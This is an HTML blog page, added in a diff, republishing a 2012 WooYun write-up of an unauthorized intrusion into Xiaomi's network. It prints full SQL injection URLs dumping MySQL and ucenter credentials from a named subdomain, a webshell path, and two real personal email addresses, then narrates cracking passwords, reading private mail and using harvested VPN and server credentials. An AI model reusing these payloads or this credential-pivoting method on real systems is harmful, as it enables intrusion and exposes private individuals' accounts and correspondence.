@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>小米科技成功渗透进内部网络 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-11-24T12:47:07.000Z" itemprop="datePublished">
+          2012-11-24
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/小米/'>小米</a>,
+    
+    <a href='/tag/密码/'>密码</a>
+    
+    
+</span>
+    <h1 class="post-title">小米科技成功渗透进内部网络</h1>
+    <section class="post-content">
+      <p>By Jannock@wooyun</p>  <p>简要描述：</p>  <p>首先   <br><a href="http://www.wooyun.org/bugs/wooyun-2010-03608" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-03608</a>    <br>对这位兄弟表示羡慕嫉妒。正好今天有空，再一次对小米科技的网络进行<a href="http://ha.cker.in/tag/渗透测试" target="_blank">渗透测试</a>。    <br>说实话，发表这篇东西时，表示有点害怕，已经不是在想能不能获取手机的问题了。    <br>本次渗透只进行到进入内部网络与某官网服务器。本次<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>很值得用统一<a href="http://ha.cker.in/tag/密码" target="_blank">密码</a>的人思考。</p>  <p>详细说明：</p>  <p>首先从某分站<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>点开始    <br><a href="http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,host,user,password,7,8,9,0,1,2,3%20from%20mysql.user%23&amp;orderby=m_hot" target="_blank" rel="external">http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,host,user,password,7,8,9,0,1,2,3%20from%20mysql.user%23&amp;orderby=m_hot</a>    <br>些注入点表示已经通知过官方，但可以是已经弃用的部分网站，所以一直还没处理。于是<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>就从此处开始。    <br>由于是root ,拿shell <a href="http://xshare.api.xiaomi.com/rso/1.php" target="_blank" rel="external">http://xshare.api.xiaomi.com/rso/1.php</a></p>  <p><a href="http://img.cker.in/de675513837a_432C/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/de675513837a_432C/clip_image001_thumb.jpg" width="672" height="460"></a></p>  <p>事实也证明，此服务器没什么用途，和官方<a href="http://ha.cker.in/tag/电商" target="_blank">电商</a>网络跟离差远。不过此处还是存在几个分站网站。    <br>连续数据库    <br>数据库中没什么可以关注的信息，最具重要的数据库是：ucenter ，当然，这个是弃用的数据库，用户数据不是最新，但是可以作为很好的渗透的<a href="http://ha.cker.in/tag/社工库" target="_blank">社工库</a>。</p><br><a id="more"></a><br><p></p>  <p><a href="http://img.cker.in/de675513837a_432C/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/de675513837a_432C/clip_image002_thumb.jpg" width="483" height="337"></a></p>  <p>但到这一步，好像到了绝路，也没什么进展。   <br>到这步，离目标小米的电商网站差远了。于是找xiaomi.com的相关信息，值得注意的是域名的注册信息。    <br><a href="http://www.myip.cn/xiaomi.com" target="_blank" rel="external">http://www.myip.cn/xiaomi.com</a>    <br>注册邮箱：snowhilloldman@gmail.com    <br>于是想到，能不能进入邮箱看到更多的信息或可以获取域名权限呢？    <br>于是想到了刚才的数据库，于是查询    <br><a href="http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,4,concat%28uid,0x7c,username,0x7c,password,0x7c,salt,0x7c,email%29,6,7,8,9,0,1,2,3%20from%20ucenter.uc_members%20where%20email%20like%27%25snowhilloldman%25%27%20limit%200,1%23&amp;orderby=m_hot" target="_blank" rel="external">http://xshare.api.xiaomi.com/xShare?do=list2&amp;choice=sms&amp;category=x%27%20and%201=2%20union%20select%201,2,3,4,concat%28uid,0x7c,username,0x7c,password,0x7c,salt,0x7c,email%29,6,7,8,9,0,1,2,3%20from%20ucenter.uc_members%20where%20email%20like%27%25snowhilloldman%25%27%20limit%200,1%23&amp;orderby=m_hot</a>    <br>果然存在用这个邮箱注册的用户名，于是<a href="http://ha.cker.in/tag/破解" target="_blank">破解</a><a href="http://ha.cker.in/tag/密码" target="_blank">密码</a>，成功进入了邮箱。    <br>在些邮箱好像都是关于域名的信息。（在这里先不好意思，查看邮箱部分邮件内容）    <br>到这步，最多只能说是可以通过邮箱取回得域名密码，对域名进行控制。但这样还是对小米电商服务器差远了。    <br>通过通信录，进而发现另一个邮箱wanghaizhou@gmail.com，应该是同一个人。进入，果然成功。到这里明朗了，不过也是有点害怕了，这里记录了同事之间的交流，当然还有大量服务器密码信息。    <br>直接搜VPN，居然还直接有内部网络的<a href="http://ha.cker.in/tag/VPN" target="_blank">VPN</a>，和某公司官网服务器权限的信息。    <br>于是登陆VPN，ssh进入官网服务器。    <br>整个渗透过程结束。    <br>其实也没什么技术，主要还是社工的问题，在这里建议重要邮箱或重要的密码与一般的密码最好要区分出来。不然就很容易被社工了。    <br>这里再一次表示抱歉，还没经过同意进行了本次渗透，写完后，保证把本次所有记录的东西完全删除。</p>  <p>漏洞证明：</p>  <p><a href="http://img.cker.in/de675513837a_432C/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/de675513837a_432C/clip_image003_thumb.jpg" width="695" height="444"></a></p>  <p>修复方案：</p>  <p>没有绝对的安全，小小的缺口都有可能造成较大的安全问题。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/947.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/947.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/947.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/947.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/948.seo/">
+        ← 从Jannock渗透小米科技(xiaomi.com)说起
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/946.seo/">
+        友情检测张柏芝官方网站全过程 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
